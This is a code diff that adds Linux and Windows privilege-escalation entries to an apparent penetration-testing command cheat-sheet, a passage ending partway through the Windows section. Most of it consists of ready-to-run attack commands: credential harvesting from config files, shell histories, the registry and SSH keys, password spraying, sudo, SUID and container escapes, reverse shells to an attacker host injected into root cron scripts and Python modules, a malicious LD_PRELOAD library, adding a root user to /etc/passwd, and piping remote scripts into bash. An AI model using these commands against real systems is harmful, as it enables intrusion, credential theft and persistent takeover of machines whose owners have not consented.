@@ -324,7 +324,7 @@ const TACTIC_GROUPS = [
     id: 'group-post',
     name: 'Post-Compromise',
     icon: '🏴',
-    tacticIds: ['basic-enum', 'mssql', 'persistence', 'post-exploit'],
+    tacticIds: ['basic-enum', 'mssql', 'persistence', 'post-exploit', 'linux-privesc', 'windows-privesc'],
   },
   {
     id: 'group-sqlmap',
@@ -1501,7 +1501,510 @@ const TACTICS = [
     ],
   },
 
-  /* ── 15. Footprinting ───────────────────────────────────────────────────── */
+  /* ── 15. Linux Privilege Escalation ─────────────────────────────────────── */
+  {
+    id: 'linux-privesc',
+    name: 'Linux Privilege Escalation',
+    icon: '🐧',
+    techniques: [
+      /* ── Credential Access ─────────────────────────────────────────────── */
+      {
+        id: 'lpe-creds',
+        name: 'Credential Access',
+        description: 'Recover credentials stored on the system to escalate privileges or move laterally.',
+        tags: ['linux', 'privesc', 'credentials'],
+        subtechniques: [
+          {
+            id: 'lpe-cr',
+            name: 'Reused Passwords',
+            commands: [
+              { id: 'lpr1', label: 'Try found password for root', os: 'Linux', command: 'su - root', notes: 'Attempt any credential found in config files, history, or DBs against the root account.' },
+              { id: 'lpr2', label: 'Spray found password across local users', os: 'Linux', command: "for user in $(awk -F: '$3>=1000{print $1}' /etc/passwd); do\n  echo -n \"[*] Testing $user... \"\n  echo '$$PASSWORD' | timeout 2 su -c id $user 2>/dev/null && echo \"[+] WORKS: $user:$$PASSWORD\"\ndone", notes: 'Replace $$PASSWORD with the discovered credential.' },
+              { id: 'lpr3', label: 'Try SSH locally with found cred', os: 'Linux', command: 'ssh $$USER@localhost', notes: 'Services often share credentials — test found passwords against SSH even if found elsewhere.' },
+            ],
+          },
+          {
+            id: 'lpe-ccf',
+            name: 'Config File Credentials',
+            commands: [
+              { id: 'lpcf1', label: 'Grep configs for password strings', os: 'Linux', command: "grep -rn 'password\\|passwd\\|secret\\|api_key\\|token' /etc /opt /var /home \\\n  --include='*.conf' --include='*.config' --include='*.ini' \\\n  --include='*.yaml' --include='*.yml' --include='*.env' \\\n  --include='*.php' --include='*.py' --include='*.rb' \\\n  2>/dev/null | grep -v '^Binary' | grep '=' | head -50", notes: '' },
+              { id: 'lpcf2', label: 'Find .env files', os: 'Linux', command: "find / -name '.env' -not -path '*/proc/*' -not -path '*/sys/*' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Application .env files commonly hold DB passwords, API keys, and secrets.' },
+              { id: 'lpcf3', label: 'WordPress config', os: 'Linux', command: "find / -name 'wp-config.php' 2>/dev/null | xargs grep -E 'DB_USER|DB_PASSWORD|DB_NAME|DB_HOST' 2>/dev/null", notes: '' },
+              { id: 'lpcf4', label: 'PHP DB connection strings', os: 'Linux', command: "grep -rn 'mysqli_connect\\|new PDO\\|pg_connect' /var/www/ 2>/dev/null | head -20", notes: '' },
+            ],
+          },
+          {
+            id: 'lpe-cdb',
+            name: 'Local Database Credentials',
+            commands: [
+              { id: 'lpdb1', label: 'MySQL as root (no password)', os: 'Linux', command: "mysql -u root --password='' -e 'select user,host,authentication_string from mysql.user;' 2>/dev/null", notes: 'MySQL commonly runs as root with no password in dev environments.' },
+              { id: 'lpdb2', label: 'MySQL via sudo', os: 'Linux', command: "sudo mysql -e 'select user,authentication_string from mysql.user;' 2>/dev/null", notes: 'Requires mysql in sudo -l. Check first.' },
+              { id: 'lpdb3', label: 'Find SQLite databases', os: 'Linux', command: "find / \\( -name '*.sqlite' -o -name '*.sqlite3' -o -name '*.db' \\) -not -path '*/proc/*' 2>/dev/null", notes: '' },
+              { id: 'lpdb4', label: 'Dump SQLite users table', os: 'Linux', command: 'sqlite3 /path/to/app.db .schema\nsqlite3 /path/to/app.db "select * from users limit 20;"', notes: 'Check .schema first to discover table and column names.' },
+              { id: 'lpdb5', label: 'PostgreSQL local auth', os: 'Linux', command: "psql -U postgres -c '\\du' 2>/dev/null\npsql -U postgres -c 'select usename,passwd from pg_shadow;' 2>/dev/null", notes: 'PostgreSQL allows passwordless login from localhost as the postgres OS user by default.' },
+            ],
+          },
+          {
+            id: 'lpe-cbh',
+            name: 'Bash History',
+            commands: [
+              { id: 'lpbh1', label: 'Current user history files', os: 'Linux', command: 'cat ~/.bash_history 2>/dev/null\ncat ~/.zsh_history 2>/dev/null\ncat ~/.sh_history 2>/dev/null', notes: '' },
+              { id: 'lpbh2', label: 'All users history files', os: 'Linux', command: "find /home /root -name '.*_history' 2>/dev/null | while read f; do echo \"=== $f ===\"; cat \"$f\"; done", notes: '' },
+              { id: 'lpbh3', label: 'Grep history for credentials', os: 'Linux', command: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|secret|key|token|mysql|psql|ssh|sudo|curl.*-u|wget.*--password' | sort -u", notes: '' },
+              { id: 'lpbh4', label: 'Other CLI tool histories', os: 'Linux', command: 'cat ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null', notes: 'Database CLI tools log commands — embedded credentials in queries are common.' },
+            ],
+          },
+          {
+            id: 'lpe-cssh',
+            name: 'SSH Keys',
+            commands: [
+              { id: 'lpss1', label: 'Find SSH private keys', os: 'Linux', command: "find / \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'id_dsa' -o -name '*.pem' \\) -not -path '*/proc/*' 2>/dev/null", notes: 'Check if unencrypted: grep -l "ENCRYPTED" <file> → if no match, no passphrase.' },
+              { id: 'lpss2', label: 'Read authorized_keys (user mapping)', os: 'Linux', command: "find /home /root -name 'authorized_keys' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Shows which keys are trusted — hints at other hosts where this key may work.' },
+              { id: 'lpss3', label: 'known_hosts (pivot targets)', os: 'Linux', command: "find /home /root -name 'known_hosts' 2>/dev/null | xargs cat 2>/dev/null", notes: 'Reveals hosts this machine has connected to — lateral movement targets.' },
+              { id: 'lpss4', label: 'Use found key for root', os: 'Linux', command: 'chmod 600 /tmp/id_rsa\nssh -i /tmp/id_rsa root@localhost', notes: '' },
+              { id: 'lpss5', label: 'SSH config (proxy/pivot hints)', os: 'Linux', command: 'cat ~/.ssh/config 2>/dev/null', notes: 'May contain ProxyJump / ProxyCommand config pointing to internal hosts.' },
+            ],
+          },
+          {
+            id: 'lpe-csudo',
+            name: 'Sudo Access',
+            commands: [
+              { id: 'lpsd1', label: 'List sudo rules', os: 'Linux', command: 'sudo -l', notes: 'The most important check. Look for NOPASSWD entries and any GTFOBins-exploitable binary.' },
+              { id: 'lpsd2', label: 'Sudo to root shell directly', os: 'Linux', command: 'sudo /bin/bash\nsudo /bin/sh\nsudo su -', notes: 'If (ALL) NOPASSWD: ALL or /bin/bash is listed.' },
+              { id: 'lpsd3', label: 'vim sudo escape', os: 'Linux', command: 'sudo vim -c \':!/bin/bash\'', notes: 'If vim is in sudo -l.' },
+              { id: 'lpsd4', label: 'find sudo escape', os: 'Linux', command: 'sudo find . -exec /bin/bash \\; -quit', notes: 'If find is in sudo -l.' },
+              { id: 'lpsd5', label: 'awk sudo escape', os: 'Linux', command: "sudo awk 'BEGIN {system(\"/bin/bash\")}'", notes: 'If awk is in sudo -l.' },
+              { id: 'lpsd6', label: 'GTFOBins reference', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#sudo\n# Replace BINARY with the binary shown in sudo -l', notes: 'vim, find, awk, nmap, python, perl, less, more, man all have sudo escapes on GTFOBins.' },
+            ],
+          },
+          {
+            id: 'lpe-cgrp',
+            name: 'Group Privileges',
+            commands: [
+              { id: 'lpgr1', label: 'Check current groups', os: 'Linux', command: 'id; groups', notes: 'Dangerous groups: docker, lxd/lxc, disk, adm, shadow, video, sudo.' },
+              { id: 'lpgr2', label: 'Docker group escape', os: 'Linux', command: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', notes: 'If in docker group → full root filesystem access via container mount.' },
+              { id: 'lpgr3', label: 'LXD group escape', os: 'Linux', command: 'lxc init ubuntu:18.04 privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\nlxc start privesc\nlxc exec privesc /bin/sh\n# Then inside container:\nchroot /mnt/root /bin/bash', notes: 'Requires network to pull image. For offline: import a pre-built image first.' },
+              { id: 'lpgr4', label: 'Disk group (raw filesystem read)', os: 'Linux', command: 'debugfs /dev/sda1\n# In debugfs shell:\n# cat /etc/shadow\n# cat /root/.ssh/id_rsa', notes: 'debugfs gives raw read access to the disk — bypasses all file permissions.' },
+              { id: 'lpgr5', label: 'ADM group (read system logs)', os: 'Linux', command: "cat /var/log/auth.log | grep -iE 'password|session|accepted' | tail -50\ncat /var/log/syslog | grep -i 'pass' | head -30", notes: 'ADM group can read logs that may contain credentials sent in plaintext.' },
+            ],
+          },
+        ],
+      },
+
+      /* ── Exploit ────────────────────────────────────────────────────────── */
+      {
+        id: 'lpe-exploit',
+        name: 'Exploit',
+        description: 'Exploit vulnerable software — kernel, local services, or installed binaries — to gain root.',
+        tags: ['linux', 'privesc', 'exploit'],
+        subtechniques: [
+          {
+            id: 'lpe-esvc',
+            name: 'Services on Localhost',
+            commands: [
+              { id: 'lpsv1', label: 'List localhost-only services', os: 'Linux', command: "ss -tlnp | grep '127\\.0\\.0\\.1'\nnetstat -tlnp 2>/dev/null | grep '127'", notes: 'Services bound to 127.0.0.1 are not exposed externally but reachable from the target.' },
+              { id: 'lpsv2', label: 'All listening sockets with process', os: 'Linux', command: 'ss -tulnp', notes: 'TCP + UDP. Note services running as root that you can interact with as your current user.' },
+              { id: 'lpsv3', label: 'Probe localhost HTTP service', os: 'Linux', command: 'curl -sv http://127.0.0.1:$$PORT/\ncurl -sv http://127.0.0.1:$$PORT/api/\nwget -qO- http://127.0.0.1:$$PORT/', notes: 'Admin panels and REST APIs running internally are common privesc vectors.' },
+              { id: 'lpsv4', label: 'Forward internal port to attacker', os: 'Linux', command: 'ssh -R $$PORT:127.0.0.1:$$PORT $$USER@$$LHOST -N', notes: 'Expose the localhost service on your attacker machine via reverse SSH tunnel to interact with it properly.' },
+            ],
+          },
+          {
+            id: 'lpe-eker',
+            name: 'Kernel Version',
+            commands: [
+              { id: 'lpke1', label: 'Get kernel version', os: 'Linux', command: 'uname -r\nuname -a\ncat /proc/version', notes: '' },
+              { id: 'lpke2', label: 'Linux Exploit Suggester (LES)', os: 'Linux', command: 'curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash', notes: 'Matches kernel version against known CVEs and shows exploitation probability.' },
+              { id: 'lpke3', label: 'Linux Exploit Suggester 2', os: 'Linux', command: 'wget -q https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O /tmp/les2.pl\nperl /tmp/les2.pl', notes: '' },
+              { id: 'lpke4', label: 'searchsploit kernel (attacker box)', os: 'Linux', command: 'searchsploit "linux kernel $(uname -r | cut -d. -f1,2) local privilege escalation"', notes: 'Run from your attacker machine to search ExploitDB.' },
+              { id: 'lpke5', label: 'DirtyPipe check (CVE-2022-0847)', os: 'Linux', command: "uname -r\n# Vulnerable: 5.8 <= kernel < 5.16.11 / 5.15.25 / 5.10.102\n# Exploit: overwrites SUID binary to get root shell", notes: 'DirtyPipe allows any unprivileged user to overwrite read-only files including SUID binaries.' },
+            ],
+          },
+          {
+            id: 'lpe-ebin',
+            name: 'Binary File Versions',
+            commands: [
+              { id: 'lpbv1', label: 'Check key binary versions', os: 'Linux', command: 'sudo --version\npkexec --version\nscreen --version\nbash --version\n$(which python3) --version', notes: '' },
+              { id: 'lpbv2', label: 'sudo — Baron Samedit (CVE-2021-3156)', os: 'Linux', command: '# Affects sudo < 1.9.5p2\nsudo --version\n# Quick check for heap overflow:\nsudoedit -s \'/\' $(python3 -c \'print("A"*65536)\')', notes: 'Heap buffer overflow in sudo. Affects most distros shipped before Feb 2021. Reliable LPE.' },
+              { id: 'lpbv3', label: 'pkexec — PwnKit (CVE-2021-4034)', os: 'Linux', command: '# Affects polkit < 0.120 on most distros\npkexec --version\nls -la /usr/bin/pkexec\n# Any SUID pkexec on an unpatched system is exploitable', notes: 'Memory corruption in pkexec — local root on virtually all Linux distros. Patch was Jan 2022.' },
+              { id: 'lpbv4', label: 'Installed package versions', os: 'Linux', command: 'dpkg -l 2>/dev/null | grep -E "sudo|screen|polkit|pkexec|vim"\nrpm -qa 2>/dev/null | grep -E "sudo|screen|polkit"', notes: '' },
+              { id: 'lpbv5', label: 'LinPEAS full automated sweep', os: 'Linux', command: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /tmp/linpeas.txt', notes: 'Run LinPEAS first — it checks all binary versions, CVEs, misconfigurations, and creds automatically.' },
+            ],
+          },
+        ],
+      },
+
+      /* ── Misconfiguration ───────────────────────────────────────────────── */
+      {
+        id: 'lpe-misc',
+        name: 'Misconfiguration',
+        description: 'Abuse misconfigurations in cron jobs, SUID binaries, capabilities, file permissions, PATH, and sudoers.',
+        tags: ['linux', 'privesc', 'misconfiguration'],
+        subtechniques: [
+          {
+            id: 'lpe-mcron',
+            name: 'Cron Jobs',
+            commands: [
+              { id: 'lpcr1', label: 'List all cron jobs', os: 'Linux', command: 'crontab -l 2>/dev/null\ncat /etc/crontab 2>/dev/null\nls -la /etc/cron.*/ 2>/dev/null\ncat /etc/cron.d/* 2>/dev/null', notes: '' },
+              { id: 'lpcr2', label: 'pspy — monitor processes without root', os: 'Linux', command: 'wget -q https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O /tmp/pspy64\nchmod +x /tmp/pspy64\n/tmp/pspy64', notes: 'pspy intercepts process creation events without root. Best tool for spotting cron commands.' },
+              { id: 'lpcr3', label: 'Watch for short-lived processes', os: 'Linux', command: 'watch -n 1 "ps aux --no-headers | grep -v grep"', notes: 'Slower than pspy but no download needed.' },
+              { id: 'lpcr4', label: 'Check if cron script is writable', os: 'Linux', command: 'ls -la /path/to/cron_script.sh\nstat /path/to/cron_script.sh', notes: 'If the script run by a root cron job is world-writable → replace with a reverse shell.' },
+              { id: 'lpcr5', label: 'Inject reverse shell into writable cron script', os: 'Linux', command: 'echo \'bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\' >> /path/to/cron_script.sh', notes: 'Append rather than replace to keep the script functional (less suspicious).' },
+              { id: 'lpcr6', label: 'Writable cron dependency (library hijack)', os: 'Linux', command: '# Identify imports in the cron script:\nhead -20 /path/to/cron_script.py\n# Check if import path is writable:\npython3 -c "import requests; print(requests.__file__)"\n# Overwrite the module:\necho \'import os; os.system("bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1")\' > /path/to/module/__init__.py', notes: 'Any file or library imported by a root-run script is a hijack vector if writable.' },
+            ],
+          },
+          {
+            id: 'lpe-msuid',
+            name: 'SUID / SGID Files',
+            commands: [
+              { id: 'lpsi1', label: 'Find all SUID binaries', os: 'Linux', command: 'find / -perm -4000 -type f 2>/dev/null', notes: 'SUID = runs as file owner (usually root). Check each on GTFOBins.' },
+              { id: 'lpsi2', label: 'Find all SGID binaries', os: 'Linux', command: 'find / -perm -2000 -type f 2>/dev/null', notes: 'SGID = runs with group owner privileges.' },
+              { id: 'lpsi3', label: 'Filter out standard SUID binaries', os: 'Linux', command: "find / -perm -4000 -type f 2>/dev/null | grep -vxF \\\n  /usr/bin/sudo /usr/bin/passwd /usr/bin/su /usr/bin/newgrp \\\n  /usr/bin/chfn /usr/bin/chsh /usr/bin/gpasswd /usr/bin/pkexec \\\n  /usr/bin/mount /usr/bin/umount /usr/bin/ping", notes: 'Focus on non-standard SUID binaries — custom apps, third-party tools, and unusual system binaries.' },
+              { id: 'lpsi4', label: 'GTFOBins SUID exploits', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#suid\n\n# bash SUID:\nbash -p\n\n# find SUID:\nfind . -exec /bin/bash -p \\; -quit\n\n# vim SUID:\nvim -c \':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-p")\'', notes: '' },
+              { id: 'lpsi5', label: 'strings on custom SUID binary (PATH hijack check)', os: 'Linux', command: 'strings /path/to/suid_binary | grep -vE \'^/\'\nstrings /path/to/suid_binary | grep -E \'system|exec|popen\'', notes: 'If the binary calls a command without a full path (e.g. "service" not "/usr/sbin/service") → PATH hijack.' },
+            ],
+          },
+          {
+            id: 'lpe-mcap',
+            name: 'Capabilities',
+            commands: [
+              { id: 'lpca1', label: 'List all binary capabilities', os: 'Linux', command: 'getcap -r / 2>/dev/null', notes: 'Dangerous caps: cap_setuid, cap_net_raw, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace.' },
+              { id: 'lpca2', label: 'Python cap_setuid → root shell', os: 'Linux', command: 'python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'', notes: 'Run as the python binary that has cap_setuid+ep set.' },
+              { id: 'lpca3', label: 'Perl cap_setuid → root shell', os: 'Linux', command: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'", notes: 'If perl has cap_setuid.' },
+              { id: 'lpca4', label: 'cap_dac_read_search (read any file)', os: 'Linux', command: '# Binary with cap_dac_read_search bypasses all read permission checks.\n# Example with tar:\ntar xvf /dev/null --to-stdout /etc/shadow 2>&1', notes: '' },
+              { id: 'lpca5', label: 'GTFOBins capabilities reference', os: 'Linux', command: '# https://gtfobins.github.io/gtfobins/BINARY/#capabilities', notes: '' },
+            ],
+          },
+          {
+            id: 'lpe-mwf',
+            name: 'Sensitive Files Writable',
+            commands: [
+              { id: 'lpwf1', label: 'Check /etc/passwd writable', os: 'Linux', command: 'ls -la /etc/passwd', notes: 'If writable → add a new root-level user directly.' },
+              { id: 'lpwf2', label: 'Add root user to /etc/passwd', os: 'Linux', command: "# Generate password hash:\nopenssl passwd -1 'password123'\n# Append user (replace HASH with output above):\necho 'hax0r:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu - hax0r", notes: 'Writing a hash directly to /etc/passwd bypasses /etc/shadow lookup — works on most systems.' },
+              { id: 'lpwf3', label: 'Check /etc/shadow writable', os: 'Linux', command: 'ls -la /etc/shadow', notes: '' },
+              { id: 'lpwf4', label: 'Change root hash in /etc/shadow', os: 'Linux', command: "# Generate SHA-512 hash:\nmkpasswd -m sha-512 'newpassword'\n# Or: openssl passwd -6 newpassword\n# Replace root's hash in /etc/shadow with the output, then:\nsu - root", notes: '' },
+              { id: 'lpwf5', label: 'Check /etc/sudoers writable', os: 'Linux', command: 'ls -la /etc/sudoers\nls -la /etc/sudoers.d/', notes: '' },
+              { id: 'lpwf6', label: 'Add NOPASSWD rule to sudoers', os: 'Linux', command: "echo '$$USER ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo /bin/bash", notes: 'Verify syntax first with visudo -c. Invalid syntax can lock you out of sudo.' },
+              { id: 'lpwf7', label: 'Find other writable config files', os: 'Linux', command: 'find /etc -writable -type f 2>/dev/null', notes: '' },
+            ],
+          },
+          {
+            id: 'lpe-mrf',
+            name: 'Sensitive Files Readable',
+            commands: [
+              { id: 'lprf1', label: 'Read /etc/shadow', os: 'Linux', command: 'cat /etc/shadow', notes: 'If readable without root → crack hashes offline.' },
+              { id: 'lprf2', label: 'Crack shadow hashes (hashcat)', os: 'Linux', command: "# SHA-512crypt ($6$) — most common:\nhashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt\n# SHA-256crypt ($5$): -m 7400\n# MD5crypt ($1$): -m 500\n# yescrypt ($y$): -m 160", notes: 'Copy hashes from /etc/shadow to your attacker machine first.' },
+              { id: 'lprf3', label: 'Read root SSH private key', os: 'Linux', command: 'cat /root/.ssh/id_rsa\ncat /root/.ssh/id_ed25519', notes: 'If unencrypted → authenticate directly as root.' },
+              { id: 'lprf4', label: 'Use stolen root SSH key', os: 'Linux', command: 'chmod 600 /tmp/root_key\nssh -i /tmp/root_key root@localhost', notes: '' },
+              { id: 'lprf5', label: 'Find other readable secrets', os: 'Linux', command: "find /root /home -readable -type f 2>/dev/null | grep -iE '\\.ssh|pass|secret|key|token|cred' | head -20", notes: '' },
+            ],
+          },
+          {
+            id: 'lpe-mpath',
+            name: 'Writable PATH',
+            commands: [
+              { id: 'lpwp1', label: 'Check for writable dirs in current PATH', os: 'Linux', command: 'IFS=: read -ra _p <<< "$PATH"\nfor d in "${_p[@]}"; do [ -w "$d" ] && echo "[WRITABLE] $d"; done', notes: 'A writable PATH dir → create a malicious binary named after a command called by a SUID binary or sudo script.' },
+              { id: 'lpwp2', label: 'Check sudo secure_path', os: 'Linux', command: "sudo -l | grep 'secure_path'\n# Also check: sudo env | grep '^PATH'", notes: 'sudo often sets its own PATH (secure_path in sudoers) regardless of your environment.' },
+              { id: 'lpwp3', label: 'Identify relative command in SUID binary', os: 'Linux', command: 'strings /path/to/suid_binary | grep -E \'^[a-z]\'', notes: 'If the binary calls "service start" instead of "/usr/sbin/service start" → PATH hijack is possible.' },
+              { id: 'lpwp4', label: 'Create malicious binary in writable PATH dir', os: 'Linux', command: "echo -e '#!/bin/bash\\n/bin/bash -p' > /writable-dir/COMMAND_NAME\nchmod +x /writable-dir/COMMAND_NAME\nexport PATH=/writable-dir:$PATH", notes: 'Replace COMMAND_NAME with whatever the SUID binary calls. Run the SUID binary after to trigger it.' },
+            ],
+          },
+          {
+            id: 'lpe-mldp',
+            name: 'LD_PRELOAD via sudoers',
+            commands: [
+              { id: 'lpld1', label: 'Check for LD_PRELOAD in sudo env_keep', os: 'Linux', command: 'sudo -l | grep -i LD_PRELOAD', notes: 'If env_keep includes LD_PRELOAD → any .so you write is loaded by the sudo command running as root.' },
+              { id: 'lpld2', label: 'Write malicious shared library', os: 'Linux', command: "cat > /tmp/evil.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0); setuid(0);\n  system(\"/bin/bash\");\n}\nEOF\ngcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles", notes: 'The _init() function executes automatically when the library is loaded.' },
+              { id: 'lpld3', label: 'Execute sudo with LD_PRELOAD', os: 'Linux', command: 'sudo LD_PRELOAD=/tmp/evil.so /usr/bin/ALLOWED_BINARY', notes: 'Replace ALLOWED_BINARY with any binary listed in your sudo -l. Library loads as root before the binary runs.' },
+            ],
+          },
+        ],
+      },
+    ],
+  },
+
+  /* ── 16. Windows Privilege Escalation ───────────────────────────────────── */
+  {
+    id: 'windows-privesc',
+    name: 'Windows Privilege Escalation',
+    icon: '🪟',
+    techniques: [
+      /* ── Credential Access ─────────────────────────────────────────────── */
+      {
+        id: 'wpe-creds',
+        name: 'Credential Access',
+        description: 'Recover credentials stored on the system to escalate privileges or move laterally.',
+        tags: ['windows', 'privesc', 'credentials'],
+        subtechniques: [
+          {
+            id: 'wpe-cr',
+            name: 'Reused Passwords',
+            commands: [
+              { id: 'wpcr1', label: 'Try found password for local admin', os: 'Windows', command: 'net use \\\\127.0.0.1\\C$ /user:Administrator "$$PASSWORD"', notes: 'Quick check — successful mount confirms local admin access.' },
+              { id: 'wpcr2', label: 'Test WinRM with found creds (PowerShell)', os: 'Windows', command: '$cred = New-Object System.Management.Automation.PSCredential("$$USER", (ConvertTo-SecureString "$$PASSWORD" -AsPlainText -Force))\nEnter-PSSession -ComputerName $$IP -Credential $cred', notes: '' },
+              { id: 'wpcr3', label: 'Spray found password on local accounts', os: 'Linux', command: "crackmapexec smb $$IP -u users.txt -p '$$PASSWORD' --local-auth --continue-on-success", notes: 'Run from your attacker machine. --local-auth tests against local accounts, not domain.' },
+              { id: 'wpcr4', label: 'Test RDP with found creds', os: 'Linux', command: "xfreerdp /v:$$IP /u:$$USER /p:'$$PASSWORD' /cert-ignore", notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-ccf',
+            name: 'Credentials from Configuration Files',
+            commands: [
+              { id: 'wpcf1', label: 'Recursive grep for passwords in common config extensions', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.conf,*.ini,*.xml,*.yaml,*.yml,*.env,*.txt -ErrorAction SilentlyContinue |\nSelect-String -Pattern "password|passwd|secret|apikey|api_key|token|connectionstring" -CaseSensitive:$false |\nSelect-Object Path,LineNumber,Line | Format-List', notes: '' },
+              { id: 'wpcf2', label: 'IIS web.config credentials', os: 'Windows', command: "Get-ChildItem -Path C:\\inetpub -Recurse -Filter 'web.config' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output \"=== $($_.FullName) ===\"; Get-Content $_.FullName } | Select-String -Pattern 'password|connectionString|username' -CaseSensitive:$false", notes: 'IIS connection strings often contain plaintext SQL credentials.' },
+              { id: 'wpcf3', label: 'PowerShell history file', os: 'Windows', command: 'Get-Content "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>$null\nGet-Content "$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>$null', notes: 'PowerShell command history persists across sessions and commonly contains credentials passed as arguments.' },
+              { id: 'wpcf4', label: 'All users\' PowerShell history', os: 'Windows', command: 'Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content', notes: 'Requires access to other users\' profile dirs — works as SYSTEM or local admin.' },
+              { id: 'wpcf5', label: 'Find plaintext creds in scripts', os: 'Windows', command: "Get-ChildItem -Path C:\\ -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs -ErrorAction SilentlyContinue | Select-String -Pattern 'password|passwd|secret|-pass ' | Select-Object Path,LineNumber,Line | Format-List", notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-cdb',
+            name: 'Credentials from Local Databases',
+            commands: [
+              { id: 'wpcdb1', label: 'Find SQLite database files', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include *.sqlite,*.sqlite3,*.db -ErrorAction SilentlyContinue | Select-Object FullName,Length', notes: 'SQLite databases often store application credentials — browsers, apps, services.' },
+              { id: 'wpcdb2', label: 'Query SQLite DB (sqlite3.exe needed)', os: 'Windows', command: 'sqlite3.exe "C:\\path\\to\\app.db" ".tables"\nsqlite3.exe "C:\\path\\to\\app.db" "SELECT * FROM users LIMIT 20;"', notes: '' },
+              { id: 'wpcdb3', label: 'MySQL client — try no password', os: 'Windows', command: 'mysql -u root -e "SELECT user,host,authentication_string FROM mysql.user;" 2>$null', notes: 'MySQL installed on Windows for dev/staging often has no root password.' },
+              { id: 'wpcdb4', label: 'Find MSSQL connection strings', os: 'Windows', command: "Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern 'Data Source|Initial Catalog|User ID|Password' | Format-List", notes: '' },
+            ],
+          },
+          {
+            id: 'wpe-cck',
+            name: 'Credentials from cmdkey',
+            commands: [
+              { id: 'wpcck1', label: 'List stored credentials', os: 'Windows', command: 'cmdkey /list', notes: 'Lists cached Windows credentials — RDP, network shares, domain accounts. Look for Administrator or domain entries.' },
+              { id: 'wpcck2', label: 'Use stored cred with runas', os: 'Windows', command: 'runas /savedcred /user:$$DOMAIN\\$$USER cmd.exe', notes: 'If cmdkey has a saved credential for the user — launches process with those stored credentials.' },
+              { id: 'wpcck3', label: 'Use stored cred for reverse shell', os: 'Windows', command: 'runas /savedcred /user:Administrator "cmd.exe /c $$REVSHELL_CMD"', notes: 'Replace $$REVSHELL_CMD with your payload. Useful if saved cred is for local Administrator.' },
+            ],
+          },
+          {
+            id: 'wpe-cre',
+            name: 'Credentials from Registry',
+            commands: [
+              { id: 'wpcre1', label: 'Autologon credentials', os: 'Windows', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword\nreg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v AltDefaultPassword', notes: 'Autologon stores the password in plaintext. Very common on kiosk and service machines.' },
+              { id: 'wpcre2', label: 'PuTTY saved sessions', os: 'Windows', command: 'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s 2>$null', notes: 'PuTTY sessions may contain stored usernames and proxy passwords.' },
+              { id: 'wpcre3', label: 'Global registry password search', os: 'Windows', command: 'reg query HKLM /f password /t REG_SZ /s 2>$null\nreg query HKCU /f password /t REG_SZ /s 2>$null', notes: 'Slow but thorough. Pipe to Out-File to review offline: reg query HKLM /f password /s > C:\\temp\\regdump.txt' },
+              { id: 'wpcre4', label: 'VNC password in registry', os: 'Windows', command: 'reg query "HKCU\\Software\\ORL\\WinVNC3\\Password" 2>$null\nreg query "HKLM\\Software\\RealVNC\\WinVNC4" /v password 2>$null', notes: 'VNC stores an obfuscated (not truly encrypted) password — can be decrypted with known tools.' },
+            ],
+          },
+          {
+            id: 'wpe-cua',
+            name: 'Credentials from Unattend / Sysprep Files',
+            commands: [
+              { id: 'wpcu1', label: 'Find unattend.xml files', os: 'Windows', command: 'Get-ChildItem -Path C:\\ -Recurse -Include unattend.xml,unattended.xml,sysprep.xml,autounattend.xml -ErrorAction SilentlyContinue | Get-Content', notes: 'Unattend files used for Windows deployment often contain the local Administrator password in base64.' },
